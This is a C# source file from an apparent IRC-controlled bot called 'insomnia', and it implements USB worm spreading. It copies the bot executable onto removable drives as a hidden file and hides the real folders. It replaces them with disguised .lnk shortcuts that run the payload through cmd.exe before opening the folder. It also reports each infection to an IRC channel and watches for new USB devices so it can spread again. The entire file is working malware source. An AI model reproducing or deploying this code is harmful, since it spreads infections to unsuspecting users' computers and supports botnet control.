using System;
using System.Collections.Generic;
using System.Text;
using System.Management;
using System.IO;

namespace insomnia
{
    class USBlnk
    {
        public static ManagementEventWatcher w;
        public static bool initiated = false;

        public static void StartLNK()
        {
            //Gather a list of current Removable Drives
            DriveInfo[] driveList = DriveInfo.GetDrives();

            foreach (DriveInfo drive in driveList)
            {
                try
                {
                    if (drive.DriveType == DriveType.Removable)
                    {
                        // Generate a unique USB drop name based on drive ID
                        string dropName = Convert.ToBase64String(Encoding.UTF8.GetBytes(drive.TotalSize + drive.VolumeLabel + drive.DriveFormat + "insomnia")).Replace("=", "").Substring(0, 7).ToLower() + ".exe";
                        string dest = drive.Name + dropName;
                        // Is there already a file with that name? If MD5 doesn't match then replace it and notify IRC
                        if (File.Exists(dest))
                        {
                            if (Config.botMD5 != Functions.GetMD5Hash(dest))
                            {
                                File.Copy(Config.currentPath, dest, true);
                                File.SetAttributes(dest, FileAttributes.Hidden);
                                IRC.WriteMessage("Updated a previous USB LNK spread on:" + IRC.ColorCode(" " + drive.Name) + " with a newer file:" + IRC.ColorCode(" " + Config.botMD5) + ".", Config._mainChannel());
                            }
                        }
                        else
                        {
                            // Start a new spread
                            File.Copy(Config.currentPath, dest, true);
                            File.SetAttributes(dest, FileAttributes.Hidden);

                            DirectoryInfo[] dirs = new DirectoryInfo(drive.Name).GetDirectories("*.*", SearchOption.TopDirectoryOnly);
                            int lnkCount = 0;

                            foreach (DirectoryInfo d in dirs)
                            {
                                d.Attributes = FileAttributes.Hidden;
                                CreateLNK(drive.RootDirectory.ToString(), d.Name + ".lnk", dropName, "explorer.exe " + d.FullName, d.Name);
                                lnkCount++;
                            }

                            if (lnkCount > 0)
                                IRC.WriteMessage("Completed USB LNK spread on:" + IRC.ColorCode(" " + drive.Name) + " with" + IRC.ColorCode(" " + lnkCount.ToString()) + " folders.", Config._mainChannel());
                        }
                    }
                }
                catch
                {
                }

                if (!initiated)
                    Listener();
            }
        }

        private static void CreateLNK(string drivePath, string outName, string payLoad, string redirect, string folderName)
        {
            using (ShellLink shortcut = new ShellLink())
            {
                shortcut.Target = Environment.SystemDirectory + "\\cmd.exe";
                shortcut.Arguments = "/c " + payLoad + " & " + redirect;
                shortcut.WorkingDirectory = "%CD%";
                shortcut.Description = folderName;
                shortcut.IconPath = Environment.SystemDirectory + "\\shell32.dll";
                shortcut.IconIndex = 3;
                shortcut.DisplayMode = ShellLink.LinkDisplayMode.edmMinimized;
                shortcut.Save(drivePath + "\\" + outName);
            }
        }

        public static void Listener()
        {
            WqlEventQuery q;
            var scope = new ManagementScope("root\\CIMV2");
            scope.Options.EnablePrivileges = true;

            try
            {
                q = new WqlEventQuery();
                q.EventClassName = "__InstanceCreationEvent";
                q.WithinInterval = new TimeSpan(0, 0, 3);
                q.Condition = @"TargetInstance ISA 'Win32_USBControllerdevice'";
                w = new ManagementEventWatcher(scope, q);
                w.EventArrived += Spread;
                w.Start();
                initiated = true;
            }

            catch
            {
                if (w != null)
                    w.Stop();
            }
        }

        public static void Stop()
        {
            initiated = false;
            w.Stop();
        }

        private static void Spread(object sender, EventArgs e)
        {
            StartLNK();
        }
    }
}
